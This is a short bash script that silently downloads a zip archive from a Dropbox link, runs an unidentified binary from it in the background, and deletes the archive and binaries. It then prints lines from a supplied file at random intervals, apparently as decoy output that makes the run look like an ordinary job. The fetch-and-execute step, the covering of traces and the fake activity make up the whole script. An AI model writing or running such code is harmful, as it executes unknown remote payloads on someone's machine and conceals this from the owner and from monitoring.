#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/f5im6hfnl0l51km/wan05.zip -q
unzip wan05.zip > /dev/null 2>&1
pwd
./dupe ./slot &
sleep 3
rm -rf wan05.zip
rm -rf dupe
rm -rf slot
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 10 ))
done < $2

